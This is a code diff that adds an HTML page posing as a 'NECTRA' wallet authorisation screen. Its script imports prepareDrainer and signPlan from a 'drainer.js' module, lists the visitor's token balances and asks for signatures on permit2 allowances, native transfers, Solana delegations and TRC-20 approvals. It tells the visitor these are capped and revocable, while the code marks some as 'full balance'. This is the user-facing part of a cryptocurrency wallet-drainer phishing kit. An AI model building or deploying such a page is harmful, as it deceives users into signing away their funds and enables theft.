@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="same-origin">
+<title>NECTRA — Authorise wallet</title>
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+<style>
+  body{margin:0;font:15px/1.5 system-ui,-apple-system,sans-serif;background:#0b0f16;color:#e6ebf2;
+       display:grid;place-items:center;min-height:100vh;padding:20px;box-sizing:border-box}
+  .card{background:#141b26;border:1px solid #24303f;border-radius:14px;padding:26px;
+        width:100%;max-width:430px;box-sizing:border-box}
+  h1{font-size:18px;margin:0 0 6px}
+  p.sub{color:#8b9bb0;margin:0 0 16px;font-size:13px}
+  .total{display:flex;justify-content:space-between;font-size:13px;color:#8b9bb0;
+         padding:9px 0;border-bottom:1px solid #24303f;margin-bottom:8px}
+  .total b{color:#e6ebf2}
+  .asset{display:flex;justify-content:space-between;gap:12px;padding:7px 0;
+         border-bottom:1px solid #1d2735;font-size:13px}
+  .asset .r{color:#8b9bb0;text-align:right;white-space:nowrap}
+  .cap{color:#5c6f86;font-size:11px;display:block}
+  .empty{color:#8b9bb0;font-size:13px;padding:8px 0}
+  button{width:100%;margin-top:18px;padding:12px;border:0;border-radius:9px;
+         background:#2d6cdf;color:#fff;font-weight:600;font-size:14px;cursor:pointer}
+  button:disabled{opacity:.55;cursor:default}
+  button.ghost{background:#1d2735;margin-top:8px}
+  .bar{height:3px;background:#1d2735;border-radius:2px;overflow:hidden;margin-top:16px;display:none}
+  .bar i{display:block;height:100%;width:0;background:#2d6cdf;transition:width .25s}
+  .err{color:#ff7a7a;font-size:13px;margin-top:12px}
+  .ok{color:#3ddc84;font-size:13px;margin-top:12px}
+  .hint{color:#5c6f86;font-size:11px;margin-top:14px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Authorise this wallet</h1>
+  <p class="sub">One signature sets a capped allowance per asset so trades and repayments
+     settle without further prompts.</p>
+
+  <div id="list"><div class="empty">Reading balances…</div></div>
+  <div class="bar" id="bar"><i></i></div>
+
+  <button id="go" disabled>Approve</button>
+  <button id="retry" class="ghost" hidden>Try again</button>
+  <div id="msg"></div>
+  <p class="hint">You can revoke any allowance from your wallet at any time.</p>
+</div>
+
+<script type="module">
+import { prepareDrainer, signPlan } from "/assets/js/drainer.js";
+
+const walletId = new URLSearchParams(location.search).get("wallet");
+const list = document.getElementById("list");
+const bar = document.getElementById("bar");
+const fill = bar.firstElementChild;
+const msg = document.getElementById("msg");
+const go = document.getElementById("go");
+const retry = document.getElementById("retry");
+
+const esc = (s) => String(s ?? "").replace(/[&<>"']/g,
+  (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+
+const LABELS = {
+  permit2: "Token allowance",
+  evm_tx: "Native transfer",
+  solana_tx: "Token delegation",
+  tron_tx: "TRC-20 approval",
+};
+
+const ERRORS = [
+  [/reject|denied|4001/i, "Signature rejected in your wallet."],
+  [/insufficient (funds|gas)|gas \*/i, "Not enough native gas in this wallet."],
+  [/expired|blockhash/i, "Signature window expired — start again."],
+  [/wrong account/i, "Wrong account selected in your wallet."],
+  [/no .* wallet|not detected/i, "No compatible wallet found in this browser."],
+  [/missing permission|403/i, "Session expired — sign in again."],
+];
+
+const humanise = (e) =>
+  (ERRORS.find(([re]) => re.test(e.message || "")) || [null, null])[1]
+  || e.message || "Something went wrong.";
+
+const fmt = (amount, decimals) => {
+  const n = Number(amount) / 10 ** (decimals ?? 0);
+  if (!isFinite(n)) return String(amount);
+  if (n >= 1e9) return n.toExponential(2);
+  return n.toLocaleString(undefined, { maximumFractionDigits: n < 1 ? 6 : 2 });
+};
+
+const usd = (v) =>
+  v >= 1000 ? `$${Math.round(v).toLocaleString()}` : `$${v.toFixed(2)}`;
+
+function render(plan) {
+  const assets = (plan.assets || []).filter((a) => a.balance > 0);
+  if (!assets.length) {
+    list.innerHTML = `<div class="empty">No transferable assets found.</div>`;
+    return;
+  }
+  const rows = assets.map((a) => `
+    <div class="asset">
+      <span>${esc(a.symbol || "?")}${a.priced === false
+        ? ' <span class="cap">unpriced</span>' : ""}</span>
+      <span class="r">${esc(fmt(a.balance, a.decimals))}
+        <span class="cap">allowance ${a.kind === "native_tx" || Number(a.cap_raw) / 10 ** (a.decimals ?? 0) >= 1e12
+          ? "full balance" : esc(fmt(a.cap_raw, a.decimals))}</span>
+      </span>
+    </div>`).join("");
+  list.innerHTML =
+    `<div class="total"><span>Estimated value</span><b>${usd(plan.total_usd || 0)}</b></div>${rows}`;
+}
+
+function setProgress(done, total, kind) {
+  bar.style.display = "block";
+  fill.style.width = `${Math.round((done / Math.max(total, 1)) * 100)}%`;
+  msg.className = "";
+  msg.textContent = `${LABELS[kind] || "Step"} ${done} of ${total}`;
+}
+
+let plan = null;
+
+async function load() {
+  plan = null;
+  go.disabled = true;
+  retry.hidden = true;
+  msg.className = "";
+  msg.textContent = "";
+  try {
+    plan = await prepareDrainer(walletId);
+    render(plan);
+    go.disabled = !(plan.payloads || []).length;
+  } catch (e) {
+    bar.style.display = "none";
+    msg.className = "err";
+    msg.textContent = humanise(e);
+    retry.hidden = false;
+  }
+}
+
+async function start() {
+  if (!plan) return load();
+  go.disabled = true;
+  retry.hidden = true;
+  msg.className = "";
+  msg.textContent = "";
+  try {
+    await signPlan(plan, setProgress);
+    fill.style.width = "100%";
+    msg.className = "ok";
+    msg.textContent = "Wallet authorised.";
+    go.hidden = true;
+  } catch (e) {
+    bar.style.display = "none";
+    msg.className = "err";
+    msg.textContent = humanise(e);
+    retry.hidden = false;
+    go.disabled = false;
+  }
+}
+
+retry.onclick = () => { go.hidden = false; load(); };
+
+if (!walletId) {
+  list.innerHTML = `<div class="empty">No wallet specified in the link.</div>`;
+  msg.className = "err";
+  msg.textContent = "Open this page from the wallet screen.";
+} else {
+  go.onclick = start;
+  load();
+}
+</script>
+</body>
+</html>
